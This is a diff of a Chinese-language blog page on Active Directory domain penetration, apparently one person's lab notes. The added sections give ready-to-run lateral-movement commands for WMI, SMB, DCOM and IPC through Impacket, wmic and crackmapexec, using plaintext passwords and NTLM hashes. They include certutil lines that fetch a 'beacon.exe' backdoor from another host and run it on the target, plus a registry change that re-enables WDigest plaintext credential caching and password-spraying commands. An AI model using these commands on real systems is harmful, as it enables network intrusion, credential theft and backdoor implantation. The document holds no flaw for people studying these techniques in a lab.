@@ -189,11 +189,15 @@
     <li><a href="#信息枚举">信息枚举</a></li>
     <li><a href="#本地账户攻击">本地账户攻击</a></li>
     <li><a href="#服务账户攻击">服务账户攻击</a></li>
-    <li><a href="#低速口令枚举">低速口令枚举</a></li>
     <li><a href="#横向移动">横向移动</a>
       <ul>
-        <li><a href="#ipc横向移动">IPC横向移动</a></li>
         <li><a href="#哈希传递">哈希传递</a></li>
+        <li><a href="#ipc横向移动-全称基于ipc认证的smb横向--smb横向的子类">IPC横向移动 （全称：基于IPC认证的SMB横向  。SMB横向的子类）</a></li>
+        <li><a href="#wmi横向移动不易被发现">WMI横向移动（不易被发现）</a></li>
+        <li><a href="#smb横向易被发现">SMB横向（易被发现）</a></li>
+        <li><a href="#dcom横向不易被发现">DCOM横向（不易被发现）</a></li>
+        <li><a href="#wmismbdcom横向的区别">WMI、SMB、DCOM横向的区别</a></li>
+        <li><a href="#利用低速密码枚举手段">利用低速密码枚举手段</a></li>
       </ul>
     </li>
   </ul>
@@ -282,7 +286,11 @@
       >2026-04-24</time
     >
   </span></div>
-</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h2 id="信息枚举">
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><p>域内环境基本思路：</p>
+<p>​	获取一台机器权限时，定位域控制器IP及域管理员账号。</p>
+<p>​	利用域成员主机作为跳板扩大范围，利用域管理员可以登陆域中任何成员主机特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中dump出域管理员密码，进而拿下域控制器、渗透整个内网。</p>
+<p>也可以通过域内Web应用，Exchange系统，端口服务等获取权限进行横向。</p>
+<h2 id="信息枚举">
 <a class="header-anchor" href="#%e4%bf%a1%e6%81%af%e6%9e%9a%e4%b8%be"></a>
 信息枚举
 </h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net user #枚举本地账户
@@ -430,29 +438,29 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">apt</span> <span class="n">update</span> <span class="p">&amp;&amp;</span> <span class="n">sudo</span> <span class="n">apt</span> <span class="n">install</span> <span class="n">kerberoast</span> <span class="c">#安装并用字典破解，也可使用john和hashcat进行破解。</span>
 </span></span><span class="line"><span class="cl"> <span class="n">python</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">kerberoast</span><span class="p">/</span><span class="n">tgsrepcrack</span><span class="p">.</span><span class="py">py</span> <span class="n">wordlist</span><span class="p">.</span><span class="py">txt</span> <span class="mf">1</span><span class="p">-</span><span class="n">40a50000-Offsec</span><span class="nv">@HTTP</span><span class="p">~</span><span class="n">CorpWebServer</span><span class="p">.</span><span class="py">corp</span><span class="p">.</span><span class="nb">com-CORP</span><span class="p">.</span><span class="py">COM</span><span class="p">.</span><span class="py">kirbi</span>
-</span></span></code></pre></div><h2 id="低速口令枚举">
-<a class="header-anchor" href="#%e4%bd%8e%e9%80%9f%e5%8f%a3%e4%bb%a4%e6%9e%9a%e4%b8%be"></a>
-低速口令枚举
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\Users\77629</span><span class="c1">&gt;net accounts   # 通过此命令查看锁定阈值，已调整枚举频率</span>
-</span></span><span class="line"><span class="cl">强制用户在时间到期之后多久必须注销?:     从不
-</span></span><span class="line"><span class="cl">密码最短使用期限(天):                    0
-</span></span><span class="line"><span class="cl">密码最长使用期限(天):                    42
-</span></span><span class="line"><span class="cl">密码长度最小值:                          0
-</span></span><span class="line"><span class="cl">保持的密码历史记录长度:                  None
-</span></span><span class="line"><span class="cl">锁定阈值:                                10
-</span></span><span class="line"><span class="cl">锁定持续时间(分):                        10
-</span></span><span class="line"><span class="cl">锁定观测窗口(分):                        10
-</span></span><span class="line"><span class="cl">计算机角色:                              WORKSTATION
-</span></span><span class="line"><span class="cl">命令成功完成。
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">使用Spray-Passwords.ps1工具进行名密码喷洒攻击。
 </span></span></code></pre></div><h2 id="横向移动">
 <a class="header-anchor" href="#%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8"></a>
 横向移动
-</h2><h3 id="ipc横向移动">
-<a class="header-anchor" href="#ipc%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8"></a>
-IPC横向移动
+</h2><h3 id="哈希传递">
+<a class="header-anchor" href="#%e5%93%88%e5%b8%8c%e4%bc%a0%e9%80%92"></a>
+哈希传递
+</h3><p>为了针对无法直接获取或在内存提取明文密码的情况。</p>
+<p>​	在Windows 7/2008 R2及之前系统，Wdigest默认开启，明文密码常驻内存，拿到SYSTEM权限后可通过<code>sekurlsa::wdigest</code>命令直接提取明文凭据。</p>
+<p>​	Windows 8/2012及之后系统默认关闭了Wdigest明文缓存，可通过修改注册表<code>HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential</code>为1重新开启，用户下次登录后内存中就会留存明文。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">	适用情况：
+</span></span><span class="line"><span class="cl">		1. 采用NTML验证的服务，如 WMI(135)、SMB(445)、RDP(3389)、WINRM(5985)等
+</span></span><span class="line"><span class="cl">		2. 已获取本地管理权限。
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl">	工具包括以下（根据不同端口采用不同工具）：
+</span></span><span class="line"><span class="cl">		Evil-WinRM
+</span></span><span class="line"><span class="cl">		CrackMapExec
+</span></span><span class="line"><span class="cl">		Impacket 的 wmiexec
+</span></span><span class="line"><span class="cl">		Impacket 的 mssqlclient
+</span></span><span class="line"><span class="cl">		Impacket 的 psexec
+</span></span><span class="line"><span class="cl">		Passing-The-Hash 工具包中的 pth-winexe
+</span></span></code></pre></div><h3 id="ipc横向移动-全称基于ipc认证的smb横向--smb横向的子类">
+<a class="header-anchor" href="#ipc%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8-%e5%85%a8%e7%a7%b0%e5%9f%ba%e4%ba%8eipc%e8%ae%a4%e8%af%81%e7%9a%84smb%e6%a8%aa%e5%90%91--smb%e6%a8%aa%e5%90%91%e7%9a%84%e5%ad%90%e7%b1%bb"></a>
+IPC横向移动 （全称：基于IPC认证的SMB横向  。SMB横向的子类）
 </h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">前置条件：
 </span></span><span class="line"><span class="cl">	1.获取对方主机的凭据(账户/口令或者目标账户ntml_hash)。
 </span></span><span class="line"><span class="cl">	2.启用文件和打印共享(139和445)，防火墙未限制，并且未限制默认共享（存在IPC$，C$或其他有权限上传文件的共享目录）
@@ -485,40 +493,139 @@ IPC横向移动
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">	使用工具：
 </span></span><span class="line"><span class="cl">	1. Impacket
-</span></span><span class="line"><span class="cl">		适用条件：该工具是一个半交互的横向移动工具，适用于创建Socks代理节点使用;
-</span></span><span class="line"><span class="cl">            https://github.com/fortra/impacket
-</span></span><span class="line"><span class="cl">            Python 3.8.x (pip install impacket)
-</span></span><span class="line"><span class="cl">            python psexec.py administrator:admin!@#45@192.168.3.32
-</span></span><span class="line"><span class="cl">            python psexec.py administrator:admin!@#45@192.168.3.32 ver
-</span></span><span class="line"><span class="cl">            python psexec.py administrator@192.168.3.32 -hashes :518b98ad4178a53695dc997aa02d455c
-</span></span></code></pre></div><p>一般情况下，杀软中存在默认共享访问和RPC调用的限制，所以，若目标有杀软，这条路基本就堵死了。<img src="../../images/image-20260501211511681.png" alt="image-20260501211511681"></p>
-<h3 id="哈希传递">
-<a class="header-anchor" href="#%e5%93%88%e5%b8%8c%e4%bc%a0%e9%80%92"></a>
-哈希传递
-</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">	适用情况：
-</span></span><span class="line"><span class="cl">		1. 采用NTML验证的服务，如 WMI(135)、SMB(445)、RDP(3389)、WINRM(5985)等
-</span></span><span class="line"><span class="cl">		2. 已获取本地管理权限。
-</span></span><span class="line"><span class="cl">		
-</span></span><span class="line"><span class="cl">	工具包括以下（根据不同端口采用不同工具）：
-</span></span><span class="line"><span class="cl">		Evil-WinRM
-</span></span><span class="line"><span class="cl">		CrackMapExec
-</span></span><span class="line"><span class="cl">		Impacket 的 wmiexec
-</span></span><span class="line"><span class="cl">		Impacket 的 mssqlclient
-</span></span><span class="line"><span class="cl">		Impacket 的 psexec
-</span></span><span class="line"><span class="cl">		Passing-The-Hash 工具包中的 pth-winexe
+</span></span><span class="line"><span class="cl">		适用条件：该工具是一个半交互的横向移动工具，适用于创建Socks代理节点使用。
+</span></span><span class="line"><span class="cl">            python psexec.py [user]:[password]@192.168.3.32
+</span></span><span class="line"><span class="cl">            python psexec.py [user]@192.168.3.32 -hashes :[NTML-HASH]
+</span></span></code></pre></div><h3 id="wmi横向移动不易被发现">
+<a class="header-anchor" href="#wmi%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8%e4%b8%8d%e6%98%93%e8%a2%ab%e5%8f%91%e7%8e%b0"></a>
+WMI横向移动（不易被发现）
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">WMI全称&#34;windows管理规范&#34;，从win2003开始一直存在。它原本的作用是方便管理员对windows主机进行管理。因此在内网渗透中，我们可以使用WMI进行横向移动，支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。
+</span></span><span class="line"><span class="cl">	利用条件：
+</span></span><span class="line"><span class="cl">        1、WMI服务开启，端口135，默认开启。
+</span></span><span class="line"><span class="cl">        2、防火墙允许135、445等端口通信。
+</span></span><span class="line"><span class="cl">        3、知道目标机的账户密码或HASH。
+</span></span><span class="line"><span class="cl">	利用详情：
+</span></span><span class="line"><span class="cl">Impacket套件
+</span></span><span class="line"><span class="cl">外部：(交互式&amp;单执行)
+</span></span><span class="line"><span class="cl">python wmiexec.py sqlserver/administrator:admin!@#45@192.168.3.32
+</span></span><span class="line"><span class="cl">python wmiexec.py sqlserver/administrator:admin!@#45@192.168.3.32 &#34;whoami&#34;
+</span></span><span class="line"><span class="cl">python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c sqlserver/administrator@192.168.3.32 &#34;whoami&#34;
+</span></span><span class="line"><span class="cl">下载后门：
+</span></span><span class="line"><span class="cl">python wmiexec.py sqlserver/administrator:admin!@#45@192.168.3.32 &#34;certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe&#34;
+</span></span><span class="line"><span class="cl">执行后门：
+</span></span><span class="line"><span class="cl">python wmiexec.py sqlserver/administrator:admin!@#45@192.168.3.32 &#34;c:/beacon.exe&#34;
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">-----------------------------------------------------------
+</span></span><span class="line"><span class="cl">wmic
+</span></span><span class="line"><span class="cl">CS内置：(单执行)
+</span></span><span class="line"><span class="cl">shell wmic /node:192.168.3.32 /user:sqlserver\administrator /password:admin!@#45 process call create &#34;certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe&#34;
+</span></span><span class="line"><span class="cl">shell wmic /node:192.168.3.32 /user:sqlserver\administrator /password:admin!@#45 process call create &#34;c:/beacon.exe&#34;
+</span></span></code></pre></div><h3 id="smb横向易被发现">
+<a class="header-anchor" href="#smb%e6%a8%aa%e5%90%91%e6%98%93%e8%a2%ab%e5%8f%91%e7%8e%b0"></a>
+SMB横向（易被发现）
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">SMB服务通常由文件服务器提供，它允许客户端计算机通过网络访问服务器上的共享资源。通过SMB用户可以在网络上访问和共享文件夹、文件以及打印机，从而实现在不同计算机之间方便地共享数据和打印输出。利用SMB可通过明文或HASH传递来远程执行。
+</span></span><span class="line"><span class="cl">利用条件：
+</span></span><span class="line"><span class="cl">1、文件与打印机服务开启，默认开启。
+</span></span><span class="line"><span class="cl">2、防火墙允许139、445等端口通信。
+</span></span><span class="line"><span class="cl">3、知道目标机的账户密码或HASH。
+</span></span><span class="line"><span class="cl">利用详情：
+</span></span><span class="line"><span class="cl">Impacket套件
+</span></span><span class="line"><span class="cl">外部：(交互式)
+</span></span><span class="line"><span class="cl">python smbexec.py sqlserver/administrator:admin!@#45@192.168.3.32
+</span></span><span class="line"><span class="cl">python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c sqlserver/administrator@192.168.3.32
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Overpass-the-Hash（又称 Pass-the-Key）
-</span></span><span class="line"><span class="cl">	这是一种将窃取的 NTLM 哈希或 AES 密钥转换为 Kerberos 票据，从而在 Kerberos 优先的环境中实现横向移动的攻击技术。其核心是 “升级”凭据，从仅能用于 NTLM 认证的哈希，升级为功能更全的 Kerberos TGT（票证授予票证）
-</span></span><span class="line"><span class="cl">	
-</span></span><span class="line"><span class="cl">	
-</span></span><span class="line"><span class="cl">-----------------------------------------------------------
+</span></span><span class="line"><span class="cl">内置：(单执行)
+</span></span><span class="line"><span class="cl">services -hashes :518b98ad4178a53695dc997aa02d455c sqlserver/administrator:@192.168.3.32 create -name shell -display shellexec -path C:\beacon.exe
+</span></span><span class="line"><span class="cl">services -hashes :518b98ad4178a53695dc997aa02d455c sqlserver/administrator:@192.168.3.32 start -name shell
+</span></span></code></pre></div><h3 id="dcom横向不易被发现">
+<a class="header-anchor" href="#dcom%e6%a8%aa%e5%90%91%e4%b8%8d%e6%98%93%e8%a2%ab%e5%8f%91%e7%8e%b0"></a>
+DCOM横向（不易被发现）
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">DCOM（分布式组件对象模型）是微软的一系列概念和程序接口。它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是Internet上。利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。
+</span></span><span class="line"><span class="cl">参考：https://mp.weixin.qq.com/s/9u0kprGbaU1S1BEQWj18AA
+</span></span><span class="line"><span class="cl">条件：
+</span></span><span class="line"><span class="cl">0.适用目标Win7系统以上
+</span></span><span class="line"><span class="cl">1.管理员权限PowerShell
+</span></span><span class="line"><span class="cl">2.远程主机防火墙未阻止，需要「固定端点映射端口135 + 动态高位端口」支持。
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">白银票据伪造
+</span></span><span class="line"><span class="cl">Impacket套件
+</span></span><span class="line"><span class="cl">python dcomexec.py sqlserver/administrator:admin!@#45@192.168.3.32
+</span></span><span class="line"><span class="cl">python dcomexec.py sqlserver/administrator:admin!@#45@192.168.3.32 whoami
+</span></span><span class="line"><span class="cl">python dcomexec.py sqlserver/administrator:@192.168.3.32 whoami -hashes :518b98ad4178a53695dc997aa02d455c
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">-----------------------------------------------------------
-</span></span></code></pre></div></div>
+</span></span><span class="line"><span class="cl">注意：高版本Windows（Win10 1809+/Server 2019+）默认收紧了普通DCOM组件的远程激活权限，仅特定白名单COM对象允许远程调用，因此dcomexec.py在较新系统上的成功率低于SMB/WMI类横向。
+</span></span></code></pre></div><h3 id="wmismbdcom横向的区别">
+<a class="header-anchor" href="#wmismbdcom%e6%a8%aa%e5%90%91%e7%9a%84%e5%8c%ba%e5%88%ab"></a>
+WMI、SMB、DCOM横向的区别
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">三者均为Impacket中实现Windows内网横向移动的经典脚本，核心共性是需要目标本地管理员权限、基于Windows合法管理协议实现远程命令执行，但底层调用逻辑、依赖组件、端口要求有明显差异：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">一、原理差异
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SMB类（psexec.py/smbexec.py为代表）
+</span></span><span class="line"><span class="cl">    本质是模拟微软官方PsExec工具的逻辑：先通过SMB协议（445端口）完成NTLM认证建立会话，随后通过RPC接口连接目标服务控制管理器（SCM），上传临时服务二进制/批处理文件到ADMIN$默认共享，远程创建并启动服务执行命令。其中smbexec.py相对隐蔽，不落盘完整EXE，仅生成临时批处理文件执行命令。
+</span></span><span class="line"><span class="cl">    核心特征：依赖SMB文件共享能力+服务创建权限，执行载体是系统服务进程（如svchost.exe托管的自定义服务/PSEXESVC.exe）。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">WMI类（wmiexec.py）
+</span></span><span class="line"><span class="cl">    基于Windows管理规范（WMI）实现，不直接操作服务/落盘文件：先通过135端口RPC连接WMI服务，调用Win32_Process.Create方法远程创建cmd.exe/powershell.exe进程执行命令；为实现回显，默认会把命令输出重定向到目标ADMIN$共享的临时文件，再通过SMB连接读取结果，模拟半交互式Shell。
+</span></span><span class="line"><span class="cl">    核心特征：无服务创建行为、内存执行为主，相对隐蔽，仅依赖WMI远程激活权限+临时文件读回权限（可加-nooutput参数关闭回显，完全不依赖SMB共享）。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">DCOM类（dcomexec.py）
+</span></span><span class="line"><span class="cl">    基于分布式组件对象模型（DCOM）实现：先通过135端口RPC端点映射器定位目标DCOM对象（默认调用MMC20.Application/ShellWindows/ShellBrowserWindow三个白名单COM对象），远程激活组件后通过其方法启动进程执行命令，回显逻辑和wmiexec类似，默认通过SMB共享读回结果。
+</span></span><span class="line"><span class="cl">    核心特征：依赖DCOM远程激活权限，高版本Windows（Win10 1809+/Server 2019+）默认收紧普通DCOM组件远程调用权限，成功率低于前两类。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">二、所需开放端口
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SMB类（psexec/smbexec）
+</span></span><span class="line"><span class="cl">    必开：TCP 445（SMB协议、认证、文件操作、服务RPC通信）
+</span></span><span class="line"><span class="cl">    可选：早期SMB版本可能用TCP 139，现代系统默认仅用445
+</span></span><span class="line"><span class="cl">    不需要135端口（除非额外调用计划任务逻辑）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">WMI类（wmiexec）
+</span></span><span class="line"><span class="cl">    必开：TCP 135（RPC端点映射、WMI服务连接）
+</span></span><span class="line"><span class="cl">    默认回显模式额外需要：TCP 445（读取ADMIN$共享临时结果文件）
+</span></span><span class="line"><span class="cl">    动态高位端口（通常49152~65535，依系统配置）：WMI数据传输用，部分环境可能需要放通
+</span></span><span class="line"><span class="cl">    若加-nooutput参数无回显执行，仅需135+动态高位端口，不需要445
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">DCOM类（dcomexec）
+</span></span><span class="line"><span class="cl">    必开：TCP 135（RPC端点映射、DCOM对象定位）
+</span></span><span class="line"><span class="cl">    默认回显模式额外需要：TCP 445（SMB共享读结果）
+</span></span><span class="line"><span class="cl">    必开：动态高位端口（49152~65535，DCOM数据传输端口）
+</span></span><span class="line"><span class="cl">    高版本系统若通过组策略限制DCOM端口范围，需放通对应区间
+</span></span></code></pre></div><p>一般情况下，杀软中存在默认共享访问和RPC调用的限制，所以，若目标有杀软，以上这些路基本就堵死了。<img src="../../images/image-20260501211511681.png" alt="image-20260501211511681"></p>
+<h3 id="利用低速密码枚举手段">
+<a class="header-anchor" href="#%e5%88%a9%e7%94%a8%e4%bd%8e%e9%80%9f%e5%af%86%e7%a0%81%e6%9e%9a%e4%b8%be%e6%89%8b%e6%ae%b5"></a>
+利用低速密码枚举手段
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">C:\Users\XXXX&gt;net accounts   # 通过此命令查看锁定阈值，已调整枚举频率
+</span></span><span class="line"><span class="cl">强制用户在时间到期之后多久必须注销?:     从不
+</span></span><span class="line"><span class="cl">密码最短使用期限(天):                    0
+</span></span><span class="line"><span class="cl">密码最长使用期限(天):                    42
+</span></span><span class="line"><span class="cl">密码长度最小值:                          0
+</span></span><span class="line"><span class="cl">保持的密码历史记录长度:                  None
+</span></span><span class="line"><span class="cl">锁定阈值:                                10
+</span></span><span class="line"><span class="cl">锁定持续时间(分):                        10
+</span></span><span class="line"><span class="cl">锁定观测窗口(分):                        10
+</span></span><span class="line"><span class="cl">计算机角色:                              WORKSTATION
+</span></span><span class="line"><span class="cl">命令成功完成。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">使用Spray-Passwords.ps1、crackmapexec等工具进行名密码喷洒攻击。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//明文密码传递
+</span></span><span class="line"><span class="cl">proxychains4 crackmapexec smb 192.168.3.32 -u administrator -p &#39;admin!@#45&#39; --local-auth -x &#34;whoami&#34;
+</span></span><span class="line"><span class="cl">//NTLM Hash传递
+</span></span><span class="line"><span class="cl">proxychains4 crackmapexec smb 192.168.3.32 -u administrator -H 518b98ad4178a53695dc997aa02d455c --local-auth -x &#34;whoami&#34;
+</span></span><span class="line"><span class="cl">//多目标喷射
+</span></span><span class="line"><span class="cl">proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p pass.txt &#34;whoami&#34;
+</span></span><span class="line"><span class="cl">proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p pass.txt --local-auth -x &#34;whoami&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">注意：若是本地账户需添加--local-auth 参数
+</span></span></code></pre></div><hr>
+<p>Overpass-the-Hash（又称 Pass-the-Key）
+这是一种将窃取的 NTLM 哈希或 AES 密钥转换为 Kerberos 票据，从而在 Kerberos 优先的环境中实现横向移动的攻击技术。其核心是 “升级”凭据，从仅能用于 NTLM 认证的哈希，升级为功能更全的 Kerberos TGT（票证授予票证）</p>
+<hr>
+<p>白银票据伪造</p>
+<hr>
+</div>
     <footer class="article-footer"><ul class="article-category-list"><li class="article-tag-list-item" data-aos="zoom-in">
     <a
       class="article-category-link"
@@ -566,10 +673,10 @@ IPC横向移动
         >
       </div><div>
         <span class="icon-brush"
-          >&nbsp;84.3k</span
+          >&nbsp;87.4k</span
         >
         &nbsp;|&nbsp;
-        <span class="icon-coffee">&nbsp;03:32</span>
+        <span class="icon-coffee">&nbsp;03:39</span>
       </div><div>
         <span class="icon-eye"></span>
         <span id="busuanzi_container_site_pv"
@@ -598,11 +705,15 @@ IPC横向移动
     <li><a href="#信息枚举">信息枚举</a></li>
     <li><a href="#本地账户攻击">本地账户攻击</a></li>
     <li><a href="#服务账户攻击">服务账户攻击</a></li>
-    <li><a href="#低速口令枚举">低速口令枚举</a></li>
     <li><a href="#横向移动">横向移动</a>
       <ul>
-        <li><a href="#ipc横向移动">IPC横向移动</a></li>
         <li><a href="#哈希传递">哈希传递</a></li>
+        <li><a href="#ipc横向移动-全称基于ipc认证的smb横向--smb横向的子类">IPC横向移动 （全称：基于IPC认证的SMB横向  。SMB横向的子类）</a></li>
+        <li><a href="#wmi横向移动不易被发现">WMI横向移动（不易被发现）</a></li>
+        <li><a href="#smb横向易被发现">SMB横向（易被发现）</a></li>
+        <li><a href="#dcom横向不易被发现">DCOM横向（不易被发现）</a></li>
+        <li><a href="#wmismbdcom横向的区别">WMI、SMB、DCOM横向的区别</a></li>
+        <li><a href="#利用低速密码枚举手段">利用低速密码枚举手段</a></li>
       </ul>
     </li>
   </ul>
@@ -730,7 +841,7 @@ IPC横向移动
           author: "L",
           title: "域渗透实战",
           url: "https:\/\/test692618.github.io\/post\/ad%E5%9F%9F\/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98\/",
-          description: " 信息枚举 net user #枚举本地账户 net user \/domain #枚举域内所有账户 net user [用户名] \/domain # 查看用户详情，所在组。域内最高权限组为“domain admins”。 net group \/domain # 枚举域内组 使用powershell进行信息枚举\n",
+          description: "域内环境基本思路：\n​\t获取一台机器权限时，定位域控制器IP及域管理员账号。\n​\t利用域成员主机作为跳板扩大范围，利用域管理员可以登陆域中任何成员主机特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中dump出域管理员密码，进而拿下域控制器、渗透整个内网。\n",
           cover: "https:\/\/test692618.github.io\/images\/banner.webp",
         };
       </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax ></script><script src="/js/tabs.js" integrity="" crossorigin="anonymous" data-pjax defer></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
